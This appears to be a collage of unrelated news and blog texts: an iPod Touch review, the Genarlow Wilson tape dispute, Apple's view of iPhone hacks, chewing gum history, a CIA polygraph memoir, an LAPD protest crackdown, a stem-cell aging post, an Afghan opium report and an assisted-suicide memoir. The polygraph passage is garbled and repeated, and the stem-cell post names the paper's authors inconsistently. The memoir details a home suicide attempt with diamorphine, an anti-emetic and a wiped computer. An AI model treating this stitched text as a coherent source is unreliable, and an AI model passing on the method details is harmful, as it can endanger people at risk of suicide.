Once plugged in correctly , iTunes asked me to register , but allowed me to skip that step and go to the typical setup page .
While syncing and charging , the Touch displays the same graphics as the iPhone .
Its face looks subtly different than the iPhone due to different styling features .
Rather than a shiny chrome frame , the Touch features a black anodized metal plate frame surrounding the screen , similar to the modern generation of " all metal " iPods .
There 's no iPhone - style headset ear speaker , and the home button is slightly smaller .
The Touch also does not support the iPhone 's ' tap to skip ' mic-integrated headphones .
They still work for audio output of course , but the Touch lacks a fourth conductor on the headphone jack , so there 's no way to use the iPhone 's mic , a second strike for the potential of VoIP after its lack of Bluetooth .
The Touch 's menus are slightly different different too , with a new mix of applications on the home screen .
No Stocks , Maps , Notes , or Weather , but there is a Contacts icon ( the iPhone 's contacts are hidden away on the Phone page ) .
Safari appears in the home page icons rather than in the dock like the iPhone , and there 's no Mail application at all .
The Calculator is there unchanged except — oddly enough — for its icon , which is now black with a light grey frame .
There 's also no Camera ( and no camera ) , or a Photos icon among the home page buttons .
Photos are still there , just placed in the dock - like tray at the bottom .
The Touch also sports new icons for Music and Videos in the dock instead of hiding both behind " iPod " as the iPhone does .
There is also the new WiFi Store icon labeled simply " iTunes . "

First there was the Genarlow Wilson trial , which launched a debate here about teenagers and laws governing sex .
Now a controversy is brewing over distribution of the videotape that shows the young man engaging in oral sex with a 15 - year - old girl when he too was underage .
Wilson , 21 , was sent to prison for 10 years because of the consensual liaison , something his supporters have called cruel and unusual punishment .
After the 2005 trial , Douglas County Dist .
Atty .
David McDade released more than 30 copies of the tape to state lawmakers and the media -- saying , according to the Associated Press , he was required to do so by Georgia ’s open - records law .
Snippets of the videotape have been played on television news shows nationwide .
Advertisement
This week , Democratic state Sen. Emanuel Jones -- who has called for Wilson ’s release -- asked Georgia Atty .
Gen. Thurbert Baker to investigate the tape ’s release , calling it a “ disgrace . ”
The attorney general has not responded , but Wednesday , U.S. Atty .
David E. Nahmias of Atlanta declared the tape “ child pornography under federal law . ”
“ Federal laws prohibit the knowing distribution , receipt and possession of child pornography -- that is , visual depictions of minors engaged in sexually explicit conduct -- under most circumstances , ” Nahmias said in a written statement .
Those laws , he said , “ trump any contrary requirement of the state ’s Open Records
Act that may exist . ”
Nahmias ’ statement did not mention the Douglas County prosecutor .
It said the U.S. attorney ’s office would “ neither confirm nor deny ” whether there was a criminal investigation related to the tape ’s release .

“ We further advise anyone in possession of that videotape outside of law enforcement or judicial proceedings to return it to law enforcement or destroy it immediately , ” the statement said .
McDade could not be reached for comment Wednesday .
In response to the Wilson controversy , Georgia legislators revised the law last year to make most consensual sex between teenagers a misdemeanor rather than a felony .
However , the change was not retroactive .
In June , a Monroe County judge ordered Wilson released , but the ruling was blocked by the attorney general .
The Georgia Supreme Court is to take up the matter at a July 20 hearing .

Apple has never quite made clear its opinion on iPhone hacking , but everyone has assumed that the company is against it on some level .
After all , why would Steve Jobs speak out against third - party apps on the iPhone , and then proceed to not release a real SDK to developers ?
However , Apple 's stance on the issue appears to be different than most of us expected , as PC Mag and Gearlog have discovered that Apple does n't oppose third - party hacks to the iPhone whatsoever .
The publications spoke with Apple 's Greg Joswiak and received some refreshingly candid responses to their questions about the iPhone and iPod touch .
Most notably , Joswiak said that Apple does n't oppose native software development at all , and that the company takes a neutral stance on it .
He said that the company does n't want to stop anyone from writing native apps and will not maliciously write its own software to override anyone 's third - party apps .
However , if something Apple writes does somehow negate someone 's application by accident , Apple claims no responsibility to help or fix that situation .
Seems fair .
( Whether or not Apple takes that same stance regarding the famed software unlock of the iPhone remains to be seen . )
This is very similar to Apple 's stance on the Apple TV hacks .
Apple stated several months ago that it was cool with the hacks as long as people were n't voiding any warranties .
Gearlog writes that Joswiak was careful to note that Apple could change its policy on the hacks to the iPhone at any time , but that for now , things are all good between Apple and third - party developers .
He also confirmed that the iPhone and the iPod touch would run the same platform , meaning that people 's theories about the iPod touch being able to run iPhone apps appear to be correct .
Edited for a more correct picture of a hacksaw . :P
Update : Apple has clarified several times to Gearlog that the company does not actively endorse third - party apps , rather , they will not actively work against them .
However , Apple does say that " software updates will most likely break " third - party apps .
So who Invented Chewing Gum ?
Everyone and their dog has enjoyed a piece of Gum .
The sight of a dried up , mouldering piece of chewed Gum stuck to the underside of a desk wo n’t strike the non-chewer as very appetizing , but to the Gum - chewer - well , a piece of Gum is a piece of Gum .
And there are Gum - chewers galore in this country , male and female , young and old , from every stratum of society .
No one knows for sure how many people Chew Gum , but some 35 billion sticks will find their way into American mouths this year .
That ’s about five billion packets , or twenty - five packets for each man , woman , and child in the United States .
At , say , ten cents a throw , Americans will spend this year some $ 500 million on Gum .
And you thought Gum - Chewing was on the wane ?
The urge to masticate seems to be quite strong in the human animal , for Gum - Chewing has been popular in many cultures over the last two thousand years .
The ancient Greeks chewed a gum obtained from the resin of the mastic tree .
Our words “ mastic ” and “ masticate ” are both derived from the Greek word for “ chew . ”
Over a thousand years ago , the Mayans and other American Indians chewed chicle - based Gums .
But the first Gums American colonists encountered were spruce Gums introduced to the Pilgrims by the Wampanoog Indians in the early seventeenth century .
Made from wads of resin the Indians found stuck to the bark of spruce trees , spruce gums were waxy and tough , more cordial to the teeth than to the taste buds .
Yet spruce Gums were to remain the only chews available in the United States for close to 200 years , until the introduction , in the nineteenth century , of paraffin gums .
The first spruce chewing gum to be commercially manufactured in this country was the “ State of Maine Pure Spruce Gum , ” brought out in 1848 by a Bangor , Maine entrepreneur named John Curtis .
Curtis later sold spruce gums under such names as “ American Flag ” and “ 200 Lump Spruce . ”
He also sold paraffin gums dubbed “ Licorice Lulu , ” “ Sugar Cream , ” and “ Biggest and Best . ”
Pioneers settling the American West found the Osage Indians chewing a chicle - based Gum made from the hardened sap of the sapodilla tree .
The Osage , who ’d been chewing chicle for thousands of years , had apparently obtained their first chaws from Indian tribes living south of the Mexican border , where the sapodilla grows .
The Mexican General Antonio Lopez de Santa Anna-yes , the same Santa Anna of Alamo notoriety - thought that chicle could be used in the manufacture of rubber .
So in 1839 , he brought some sapodilla sap to the American inventor Thomas Adams .
Attempts to manufacture rubber from the tree sap failed , but by the 1870 ’s , Adams ’s company was marketing the nation ’s first commercial chicle - based Chewing Gums .
Chicle , Adams found , lasted much longer than paraffin or spruce , and carried flavors better than the earlier gums .
Adams was soon selling such treats as Peppermint , Spearmint , Black Jack ( licorice , of course , still popular ) , Clove , Pepsin , and Cinnamon .
Today , the Adams Company and the William Wrigley , Jr. Company are the nation ’s largest manufacturers of Chewing Gums .
Thirty - year - old William Wrigley , Jr. moved to Chicago in 1891 and set up the Wrigley Company with just thirty - two dollars of his own money and a $ 5,000 loan .
The firm initially sold soap , then branched out into baking powder .
In 1892 , Wrigley ordered some Chewing Gum from the Zeno Manufacturing Company to offer jobbers as an inducement to buy his baking powder .
Wrigley ’s salesmen dispensed two packs of Gum with each ten - cent package of baking powder , and the jobbers soon reported that they found it much easier to sell the gum than peddle the powder .
It did n’t take Wrigley long to see the possibilities .
By the turn of the century , Wrigley ’s Gum was being sold coast to coast in stores and vending machines .
Chewing
Gum factories were soon springing up in a number of foreign countries , including Canada , England , Germany , Australia , and New Zealand .
By the end of World War II , the taste for Wrigley ’s product in America , Europe , and Asia was so great that his factories could barely keep pace with the demand .
Today , most chicle comes from Mexico .
Sapodilla trees are tapped with grooved cuts and the latex is collected in small receptacles , as in the gathering of maple syrup .
Most productive sapodilla trees are over seventy years old .
For best results , each tree is tapped only once every six to eight years .
The collected sap is then boiled , coagulated , and molded into blocks .
At the manufacturing plant , the chicle is kneaded into a hot sugar and corn syrup mixture , then flavored and rolled into thin strips .
Most modern Gums contain 20 percent chicle , 60 percent sugar , 19 percent corn syrup , and one percent flavoring .
Of course , after a few hours of chewing , the wad in your mouth is n’t likely to contain anything but the Gum itself .
Some gum manufacturers now use synthetic products to give their gum its chewiness .
Gumdrops are made not from chicle , but from gum arabic , a substance obtained from exudations of certain types of acacia tree .
Gum arabic products were used as medicaments for many years , since the slow solution of gum in the mouth allowed a steady release of the active ingredients .
Many
Gum specialties have come and gone over the 100 - year history of chewing gum marketing .
For decades , the Adams Company has been selling Chiclets , pellets of gum wrapped in a sugar candy .
The 1970 ’s saw the introduction of “ squirt ” gum , wads of Chewing Gum with liquid centers that “ explode ” into the mouth upon the first chew .
And the sweet , pink chew known as Bubble Gum needs little identification .
Bubble gum first appeared in 1933 .
But it was n’t until 1947 , when the Topps Chewing Gum Co. began to offer the familiar Bazooka penny piece .
Later , Topps included baseball cards with slabs of gum , that Bubble Gum became the ubiquitous source of oral gratification it is today .
The earliest baseball cards appeared during the 1880 ’s in packets of cigarettes and tobacco .
Candy companies began to issue cards in 1913 , and Bubble Gum manufacturers included cards with their product beginning in 1933 .
Topps entered the baseball card field in 1951 , and has since become the giant of both the Bubble Gum and baseball card industries , distributing some 250 million cards each year .
The Topps company estimates that there are now more than 100,000 serious baseball card collectors in the United States .
Enthusiasts will pay surprisingly high sums for a valuable specimen .
The largest collection of baseball cards in the world - 200,000 cards - belongs to the Metropolitan Museum of Art in New York , and the most prized Topps card in existence is the 1952 Mickey Mantle , valued as high as $ 100 .
During baseball ’s spring training period , Topps signs and photographs all rookies and established players whom they believe have a chance to make the major league rosters in the upcoming season .
Each player is photographed both wearing a cap and bareheaded .
If the player is traded to another club after his picture is taken , the bareheaded photo is used on the player ’s card .
In case you were wondering , a players is paid for the use of his picture - $ 250 each year a new card appears .
The baseball card trade is not without its lighter side .
A number of right - handed practical jokers have posed for the Topps photographer wearing a left - handed glove , or vice versa , and more than one player has appeared on a card bearing another player ’s name .
In 1969 , California Angels ’ third baseman Aurelio Rodriguez duped Topps into photographing the team batboy in his place , and thousands of cards bearing the batboy ’s image over Rodriguez ’ name were distributed before Topps caught the error .
Few people buy Topps baseball cards for the slab of Bubble Gum included in each package .
Bubble gum addicts are more likely to get their fix from a piece of Topps Bazooka Gum .
Bazooka was introduced in 1947 , and owes its name to the resemblance between the early five - cent size and the bazookas used in World War II .
Each piece of Bazooka Gum comes with a premium of sorts - a Bazooka Joe comic .
Topps first included the comics with their gums in 1953 , and in the years since , the firm has developed a repertory of close to 700 different comics .
The company tries not to repeat a joke for about seven years so that the comics are fresh for each new generation of Bubble Gum chewers .
Sugarless gums have been with us since the 1940’s , and now account for 10 percent of all chewing gum sales .
A stick of sugarless gum contains but six or seven calories - while a regular stick contains a whopping eight calories !
Gum makers have also developed gums that wo n’t stick to dentures , and they are presently working on such earth - shattering innovations as a Bubble Gum whose bubbles glow in the dark .
In the early days of Chewing Gum marketing , Gum companies tried to sell their products by stressing their value to dental health .
Advertisements pointed out that primitive races whose diets demand a great deal of chewing usually have excellent teeth .
When the Wrigley Company began to market its Chewing Gum in England around 1911 , the firm ’s ads pointed up the values of Gum to dental and mental health , claiming that Gum eased tension and thereby improved concentration .
Wrigley faced an additional challenge in convincing the Englishman to chew gum : to rid gum- chewing of its lower - class connotations .
When Wrigley began to advertise heavily in English magazines , he surprisingly chose those publications most read by the social elite .
Sure , the ads read , gum may be out of place at the opera or in Buckingham Palace , but gum - chewing can be both proper and highly beneficial at most other times .
The results of the ad campaign ?
Sales of Wrigley ’s products in England doubled over the next twenty years .
In the Soviet Union , where the manufacture of Chewing Gum is prohibited by the State , foreign tourists are frequently accosted by young Russian boys clamoring for “ tchewing guml tchewing gum . ”
Few people today chew gum for dental health .
Ask the average gum - chewer why he uses gum and you ’ll most likely receive in response , a shrug of the shoulders .
But the answer is simple : gum -chewing uses up excess nervous energy .
Studies have shown that the use of Gum rises in periods of social tension , and falls in more tranquil times .
For instance , the use of gum in this country soared from a per capita 98 sticks in 1939 to 165 sticks by the early 50’s , duplicating a similar rise during World War I. Today ’s per capita consumption of Chewing Gum stands at 175 sticks per year .
So , as if you needed any further confirmation , the Chewing Gum barometer suggests that we once again live in troubled times .
Gatekeeper : Memoirs of a CIA Polygraph Examiner ( Dulles , Virginia : Potomac Books , 2007 ) , publication of which was delayed as as result of foot - dragging by CIA censors whose nihil obstat was required .
Eager to learn anything more about events leading up to the author 's recently filed
Quote :
... In November 2003 I had submitted an application for a contract position with the Agency .
My security clearances were due to expire in May 2004 , and they would have to be updated in order for me to take the job .
To update my clearances , I would have to take a polygraph test .
I had no anxiety about taking a test , but I thought it was strange that I was instructed to go to a site in Northern Virginia and not to the Agency 's polygraph facility .
When I mentioned this to two of my former supervisors in PD [ the CIA's Polygraph Division ] , both suggested that something was amiss , and one said , " John , they 're coming after you for your book . "
During the pretest of my polygraph examination , when the examiner previewed the question on removals of classified material , he qualified the question by advising me that OS [ the Office of Security ] wanted to know if I had removed materials to make money , either to sell classified information to a foreign intelligence service or to write a book .
That got my attention .
The test did not go well , and I left the session thinking I would be brought back for more testing within a few days .
That did n't happen , and on March 25 , 2004 , I had a meeting with someone from Clearance Division who , among other things , told me that I was concealing information about my book and that the results of my test were " unresolved reactions to all issues . "
This is PD speak for deception indicated to all issues .
I was surprised , angry , and a little bit frightened .
At a subsequent retirement party in November 2004 that I attended at PD , I saw a former friend and colleague coming toward me .
I said hello and stuck out my hand .
He turned his back and walked away without saying a word .
Three months later , on February 14 , 2005 , I was notified that my request for a security clearance had been denied .
The comments made by two former colleagues prior to my polygraph test , the way the test was conducted , the interview with the Clearance Division reprenestative , and the incident at the retirement party left me with no doubt that OS / PD had in fact come after me for my book .
I immediately appealed the decision .
Appeals of OS security clearance denials are rarely upheld , and I was completely taken by surprise when on June 27 , 2005 , I was notified that " the security decision to deny me a clearance had been overturned . "
Any satisfaction I derived from that decision is tempered by my knowledge that between the time I took my polygraph test and the time I had my clearance restored , two job offers were withdrawn , my reputation was damaged , and my chances working as an Agency contractor are slim to none .
Throughout my career I believed in and advocated the Agency 's polygraph program .
If my last polygraph test is an example of how PD is now doing business , I can no longer advocate the division , and that saddens me ....
Well , of course Mr. Sullivan 's last polygraph test is an example of how the CIA 's Polygraph Division is doing business !
And Mr. Sullivan is far from the only person to have been falsely accused of deception and wrongly denied a security clearance following a failed polygraph .
But those without a 31 - year history of CIA employment are generally not so successful in appealing such wrongful denials .
See the I have at long last received my copy of retired CIA polygraph examiner John Sullivan 's book , ( Dulles , Virginia : Potomac Books , 2007 ) , publication of which was delayed as as result of foot - dragging by CIA censors whosewas required .
Eager to learn anything more about events leading up to the author 's recently filed lawsuit against the CIA , I began reading at the end .
In his epilogue , Sullivan writes how he , who conducted more polygraph examinations than anyone else in the Agency 's history , came to fail a CIA polygraph examination to which he submitted after his retirement from the CIA .
Sullivan writes ( pp. 262-63 ) : Well , Mr. Sullivan 's last polygraph test is an example of how the CIA 's Polygraph Division is doing business !
And Mr. Sullivan is far from the only person to have been falsely accused of deception and wrongly denied a security clearance following a failed polygraph .
But those without a 31 - year history of CIA employment are generally not so successful in appealing such wrongful denials .

LAPD swept through the May Day Immigration Reform Protest at MacArthur Park , causing panic and assaulting attendees and several media spokesman and journalist .
It has to be one of the most blatant cases of excessive force used by the LAPD , and was probably recorded by more people than any other example of police misconduct and aggressiveness .
Police began clearing the park after alleged attacks by protesters throwing bottles .
Rubber bullets were fired at protesters and journalists , as the police cleared the park with multiple cameras ’ rolling , capturing incredible scenes of the confrontation .
Fox11 LA , Telemundo and Univision are a few of the new news agencies that were present covering May Day .
While Univision reporters were setting up interviews , shoots rang out from the LAPD and batons started swinging .
FOX 11 ’s Christina Gonzalez and her videographer , Patti were close by filming and were also assaulted by the police with the camera ’s rolling .
There were so many cameras rolling that they all caught each other in a odd panoramic landscape , with bits and pieces showing the entire area from multiple angles .
Several camera men , reporters and media personnel are filmed being hit with batons and having their equipment snatched from their hands and tossed away .
The clips of the incident speak for themselves as this small protest was brought to a terrifying end .
The Radio and Television News Association is demanding an investigation , and planning on conducting its own investigation .

Chief William Bratton has issued a statement regarding the incident , and Mayor Antonio Villaraigosa also issued statements , calling the police reactions unfortunate .
Villaragosa is in the unenviable position of having to speak on the actions of the LAPD , while he is in El Salvador , meeting with business leaders and discussing ways of boosting revenue in their countries and eliminating gang violence .
Instead of answering his planned questions , he will now have to face questions regarding immigration policies and police brutality in his city .
The violent reaction is by LAPD was surprising for a number or reasons .
The fact that it happened at all , considering the lower than expected numbers of protesters attending , is another odd factor to this story .
If the May Day Rally had as many people as was expected , it might have been much worse .

I am a Californian , a biogerontologist , and a lifespan extension advocate , so it goes without saying that I ’m a proponent of human embryonic stem cell ( hESC ) research .
Sometimes , however , I feel like the discussion of hESCs ’ therapeutic potential is a bit simplistic , and treats these complex and often cantankerous living entities as though they were some sort of passive magic elixir , which one must simply add to a system in order to achieve the desired effect .
Especially in the context of using hESCs to recover humans from age - related decline in tissue function , the situation is — while still promising — much thornier .
A good deal of recent work suggests that the environment in which a stem cell resides ( the “ niche ” ) is at least as important to regenerative capacity as any property of the stem cell itself .
A recent paper by Carlson and Conboy expands our knowledge of the deleterious effect of old niches on young cells ; provides some tantalizing evidence of a mechanism , involving regulation of gene expression in the stem cells ; and underscores the fundamental importance of studying the interaction between cells and their microenvironment .
Loss of stem cell regenerative capacity within aged niches
This work uncovers novel mechanisms of aging within stem cell niches that are evolutionarily conserved between mice and humans and affect both embryonic and adult stem cells .
Specifically , we have examined the effects of aged muscle and systemic niches on key molecular identifiers of regenerative potential of human embryonic stem cells ( hESCs ) and post-natal muscle stem cells ( satellite cells ) .
Our results reveal that aged differentiated niches dominantly inhibit the expression of Oct4 in hESCs and Myf - 5 in activated satellite cells , and reduce proliferation and myogenic differentiation of both embryonic and tissue - specific adult stem cells ( ASCs ) .
Therefore , despite their general neoorganogenesis potential , the ability of hESCs , and the more differentiated myogenic ASCs to contribute to tissue repair in the old will be greatly restricted due to the conserved inhibitory influence of aged differentiated niches .
Significantly , this work establishes that hESC - derived factors enhance the regenerative potential of both young and , importantly , aged muscle stem cells in vitro and in vivo ; thus , suggesting that the regenerative outcome of stem cell - based replacement therapies will be determined by a balance between negative influences of aged tissues on transplanted cells and positive effects of embryonic cells on the endogenous regenerative capacity .
Comprehensively , this work points toward novel venues for in situ restoration of tissue repair in the old and identifies critical determinants of successful cell - replacement therapies for aged degenerating organs .
The most straightforward implication of Morgan and Conboy ’s findings is that we will need to address the tissue microenvironment / niche / cell - cell signaling issues in order to optimize the therapeutic potential of hESCs introduced into an aged patient .
An obvious corollary is that identifying , targeting and inhibiting the “ dominant ” factors that decrease hESC pluripotency and proliferative capacity should be a major priority for scientists interested in developing stem - cell based solutions to the treatment of age - related disease .
( An aside about those quotation marks : I have a picky objection to the authors ’ use in the abstract of the term “ dominantly , ” which I think should be reserved for relationships between alleles of the same gene : specifically , in which the dominant allele governs the phenotype regardless of the identity of the other allele .
That said , I certainly know what they mean , and I further acknowledge that very new science is an undiscovered country to which a consistent nomenclature is often the last to arrive .
The expression for an analogous relationship between different genes acting within the same pathway would be “ epistatic ” ; I ’m not at all sure what the term ought to be for a gene acting in one cell but having an effect on a neighboring cell . )
This work also demonstrates the growing utility of a concept from developmental biology : “ non-cell - autonomous behavior , ” in which some phenomenon ( especially gene expression ) acts “ at a distance , ” as it were , and causes a phenotype in another cell .
This is as distinct from “ cell - autonomous behavior , ” in which the scope of a gene ’s effect is limited to the cell that ’s expressing it .
Recently , I ’ve increasingly noticed the use of the former term in discussions of a wide variety of findings , in both our lab and in others .
I ’d call it an important emerging theme in biogerontology .

Afghanistan 's opium production has doubled since 2005
The UN Office on Drugs and Crime report says the amount of opium produced there has doubled in the last two years .
It says Helmand province is now the biggest single drug - producing area in the world , surpassing whole countries such as Colombia .
Afghanistan now accounts for more than 93 % of the world 's opiates .
Despite billions of dollars of aid and tens of thousands of international troops , the report says 193,000 hectares of opium poppies are being grown in Afghanistan .
' Insurgency link '
" The results are very bad , terrifyingly bad , because cultivation has increased by 17 % to an historic level , " said Antonio Maria Costa , executive director of the Office on Drugs and Crime .
" No other country beside China in the 19th Century ever had such a large amount of land dedicated to illegal activities .
" The province of Helmand in the south has cultivated more opium than in the rest of Afghanistan .
" It has become the largest single entity in terms of both production and cultivation , " he said .
Despite the overall increase , twice as many provinces are now drug - free in northern and central Afghanistan .
The report says growing opium poppies is now closely linked to the insurgency and the instability in the south .
And what is to be done ?
The report recommends more determined efforts to bring that security .
It urges the government to get tough on corruption , which it says is driving the drugs trade and it lists poor governance , a weak judiciary and failing eradication programmes for these new frightening record levels .
When Michael Graham 's wife Elizabeth was diagnosed with motor neurone disease , she made up her mind to die before she became completely immobile .
Michael knew he would have to help her - even though it could land him in jail .
What he was n't prepared for was how long it would take and how far he would have to go
In the spring of 2001 my wife caught her right foot on a doorstep and fell headlong , badly damaging her left hand .
It recovered , but two months later it began to spasm , fingers shooting out without warning in all directions .
The doctor diagnosed a trapped nerve .
But then she had three more bad falls , and throughout the next summer she often found herself suddenly staggering into furniture .
It was becoming obvious that the problem was n't simply a trapped nerve , so she was referred to a neurologist , who ordered a scan .
I went to see him in December , and though he had n't yet received the full results , I think he was trying to warn me that the problem might be serious .
And it turned out to be so .
Elizabeth was diagnosed with motor neurone disease the next spring .
We were immediately inundated with experts - a motor neurone disease nurse , occupational therapists , physiotherapists .
They arranged for a wheelchair .
They were positive and constructive and seemed to assume that we could cope with all the problems that would come up .
But Elizabeth was n't so sure , and wanted to know the worst , so we turned to the internet .
Motor neurone disease is caused by an irreversible degeneration of the motor neurones , the nerves that control movement .
The course of the disease is different in every patient , but the end is the same : complete loss of mobility , then death .
The terrible thing is that sufferers retain all their mental faculties .
Very definitely , and fairly early , Elizabeth decided that she would not wait for this to happen .
She just said to me one day , as we were sitting out in the garden , " I 'm not going to go on . "
Apart from the initial shock , I have to say it did n't surprise me .
We had both talked about how we did n't want to die the way some of our friends had - one in particular , who had Alzheimer 's and lingered on for years after he had ceased to know what was going on .
I guess I could have refused to cooperate , and forced her into a nursing home .
But I think that would have been disastrous - for her , anyway .
I was n't there when she told our children what she was going to do , and gradually I began to realise that they understood her intentions rather differently than I did ; that our daughter , particularly , was more aligned with Elizabeth 's views than I was .
So I wrote her a long letter , arguing that I was in favour , but only when it became necessary ; only when Elizabeth 's quality of life had declined so much it had become intolerable .
It seemed to me that she was jumping the gun , talking about doing it fairly quickly , perhaps not even reaching her birthday , which I thought was crazy .
But the disease was progressing fast , too , in some ways faster than I realised .
She had been an active , independent woman who used to climb and ski , but before long she was increasingly in a wheelchair .
She was a keen amateur painter , but her hands were weakening fast ; in October she attended a life class and did her last good pastel drawing .
Face and throat muscles are often involved , and she was finding it increasingly difficult to make herself understood .
" Love to see visitors , " she wrote in a diary , " but feel like weeping with exhaustion once gone . "
The doctors promised her bladder would n't be affected , but that month she choked on a sweet and " with coughing , wet myself thoroughly .
Devastating ! "
By the following spring she was in a wheelchair all the time .
I became a full - time carer .
She could n't get out of bed herself .
She could still stand , but not without me holding her .
Her feet were very weak , because muscles waste when they are not being used .
In the morning I had to take her into the bathroom and lift her on to a special chair rigged up in the bath , then swing her legs over so that it could lower her into the water .
Occasionally we missed , and she would end up perched on the edge of the bath .
This would often make us dissolve into laughter , but I 'm in my 80s now , and if she had fallen to the floor I would have had to call for help .
During the day she would buzz about the house in her battery - powered wheelchair .
You can still see the damage on the doorframes .
Eventually I was doing all the cooking .
I can't stand going to Tesco , but she liked it .
Of course , she could n't reach the shelves .
Sometimes I 'd lose her and wander around asking shoppers , " Anyone seen my wife ? "
She read a lot - almost a book a day .
She enjoyed good television , her food , her family , friends visiting .
She certainly enjoyed the company of our dog .
Physically she was deteriorating rapidly , but in terms of her quality of life , I believed there were many things she could still enjoy .
As far as her decision was concerned , I did n't think of it as happening next week or next month .
I knew we were moving towards it , but when it was going to arrive I did n't know .
Occasionally , Elizabeth had dreadful sobbing jags - not often , perhaps three or four times .
She had one once when I was helping her in the bathroom , and I said , gently , " You can always change your mind , you know . "
She used to get immensely upset if I said anything like that because she thought I was trying to persuade her not to do it .
But I was n't .
I was just testing that she was sure , and trying to get her to wait until it became ... time .
Her great surges of emotion ( which I have now ) did n't change her mind .
They were just a symptom of the terrible situation she found herself in : she did n't want to kill herself .
She felt she had to , but she did n't want to .
I found out later that she had been writing to a friend , asking for advice on how to do it , about what drugs she could use , and mentioning that she was thinking of slitting her wrists .
This friend had consulted medical people and replied that she would n't advise anybody to try some of the drugs Elizabeth had mentioned , and that wrist - cutting usually does n't work .
So Elizabeth had to turn to me for help , and I turned to the internet , trying to buy prescription painkillers without a prescription .
The one foreign firm I did manage to contact simply sent me advertising material ; our daughter thought that even if they had sent the drug , it would probably have been stopped at customs .
So I did n't pursue it , because I did n't want to attract any attention .
I also contacted Dignitas , the euthanasia society based in Zurich , but Elizabeth much preferred the option of being at home when the time came .
Eventually we managed to get some morphine linctus and ampoules of diamorphine .
It was reputed to be enough to kill a horse .
But we had to make sure Elizabeth did n't throw it all up again , so we had to find an anti-emetic as well .
I had a friend with mental health problems who had considered committing suicide himself ; he supplied us with the anti-emetic - and advised me to clear my computer of all the emails with any mentions of drugs , all the downloads .
Committing suicide is legal here , but assisting it is n't , so I spent about a week attempting to wipe the hard drive .
Eventually I had to take it to a friend 's son , who is a computer expert .
Finally everything was ready .
It was just a question of when .
I can't remember what we had for dinner on April 21 2006 .
It was nothing special .
Our daughter was with us for a few days , visiting , and we usually had a glass of wine and some nibbles before dinner , and wine with dinner ; we had that .
But over dinner the talk turned to our preparations , and gradually it became clear that although I still thought she was going too fast , Elizabeth felt now was the time ; she said she was ready , and obviously it was good for me to have our daughter there .
So at 10.30 pm Elizabeth drank the necessary quantity of the anti-emetic .
We went to the bedroom at about 11 o'clock , and helped her into her best nightgown .
Elizabeth was very particular about her appearance , always getting me to brush the dog hairs off her skirts - dark skirts , which showed up the dog hairs .
If she 'd only worn white skirts they would n't have shown .
We wiped all the bottles .
I was prepared to go to jail if I had to , though I hoped it would n't come to that ; our daughter , however , we did n't want implicated in any way .
She said goodbye to her mother , and gave her a hug .
At that point she was all right .
Then she went through to the living room by herself , and sat on the sofa , waiting .
That was when she began to go to pieces .
Elizabeth broke the ampoules of diamorphine , dissolved them in the morphine linctus , and poured the potion out , into a plastic beaker .
She drank it , and lay down .
I lowered the bed , then sat at her side and held her hands .
She was calm , and I surprised myself - I was calm too .
" I hope this damn stuff is kosher , " I said - trying to make a joke of it .
Then I just sat there , holding her hands and watching her breathing .
I thought it would slow , but it did n't .
She was quiet , but then she kept finding that she was n't going to sleep when she thought she should be .
At some point we cracked another joke - neither of us believed in the afterlife .
But there was the question , if there was an afterlife , would she be looking down from above on what was going on , or up from below ?
Finally she said , " I can get to sleep quicker reading my book . "
And she got her book , and sat up a bit .
It was one of her whodunits - I believe it was a Dick Francis .
Just a light thing .
She had probably read it before .
It was difficult to find a book of that nature she had n't read before .
She was a voracious reader , and my encyclopaedia : if I could n't remember an author or a name , she could .
Eventually she said , " Do n't you sit up any longer - you go to bed . "
It was about three - quarters of an hour after she 'd taken the drug .
I said , " Well , I 'll never get to sleep , " but I did as she asked .
I just wished her goodnight , and that was it .
What do you say ?
I told our daughter that Elizabeth wanted us to go to sleep .
She went upstairs , and I went to my room - Elizabeth and I had separate rooms because we could n't get the wheelchair and two beds into our room - and I really did n't think I 'd be able to sleep , but I did .
I had to get up at about three to go to the loo .
Her light was off , and stupidly I did n't realise what I was looking at , that Elizabeth must have turned it off .
I thought , " Well , I wo n't go in , because I 'll have to call a doctor first thing in the morning .
And I went to the loo and went back to bed . "
At five o'clock - oh , dear God , I still shudder to remember the sound of it - her bell rang .
I 've never heard anything worse in all my life .
I rushed through to her .
She was retching and heaving and crying , just in a desperate state .
She asked for a bowl because she was going to be sick .
She begged me to cut her wrists .
Although I so wanted to help her , I could n't do that .
We would just have to use Dignitas .
Our daughter , who had n't heard the bell , came downstairs shortly afterwards .
When she saw what had happened , she was absolutely distraught .
Elizabeth threw up for several hours .
It took a few days to get back to some sort of normality .
Our daughter was a great help , but eventually she had to return to her own family .
It was the last time she would see her mother .
Applying to Dignitas is quite a complicated process , for good reason : they want to make sure you 're not doing anything on impulse , so you have to provide copies of birth certificates , and doctors ' assessments , and Elizabeth had to write them a detailed letter explaining that she was of sound mind , and exactly why she wanted to end her life .
I had initially told them that we wanted to set it all up just in case , that we did n't have a date yet , as the time had n't come , but after our harrowing DIY attempt , I wrote to them and said that we were ready , and wanted to pursue the issue with some urgency .
They suggested a couple of dates , and we chose Tuesday June 6 .
I arranged for the dog to be left with friends , as we usually do when we go away .
But I thought it would be too rough on Elizabeth to start off with the dog in the car .
So I asked them to take her the night before .
The dog always jumped into a car if it had a door open .
Any car at all .
But this time she was sitting beside Elizabeth , and did n't move .
I had to pick her up and put her in the car .
And suddenly Elizabeth was in one of her sobbing moods , and all she could say was , " My poor little dog ! "
I felt awful , that I might have done the wrong thing , but I do n't think I did .
It would have been even more distressing for her to watch the dog being dropped off .
In some ways that daft dog was a bit of cement in our relationship .
Elizabeth could n't make the journey all in one - there was no way for her to go to the loo - so we split the journey into stages .
Our son met us at the local airport , and a couple of friends helped us get the special wheelchair on the plane .
We had initially thought about going as a family , but our daughter was so upset by the first attempt that she did n't think she could stand it .
I was glad our son came .
I think I would have found it all too difficult on my own .
We flew to Gatwick , where we stayed overnight in an airport hotel .
Elizabeth had n't wanted to say goodbye to too many friends , but some had to know , and wanted see her , so a couple came to the hotel for dinner .
The undertow of what was going to happen was always there , of course , but we had a pleasant evening - lots of chat , and laughter .
We arrived in Zurich on the Sunday , and saw the Dignitas doctor first thing Monday .
His job was to assess Elizabeth 's physical condition , and to assure himself that this was her own definite wish , that we had n't pressured her .
I kept out of it - except that Elizabeth had trouble talking , so in the end I had to chip in and answer for her .
The interview was successful , and the doctor agreed to provide the necessary drug .
Then we went out for a late lunch at a cafe and talked .
The sun shone .
It was beautiful , like an amazing little holiday .
We were staying at a fairly good hotel used by businesspeople , and while on one level it seemed normal , on another it was terribly weird .
You would be walking along , pushing a wheelchair , and thinking , " We 're here for Elizabeth to die . "
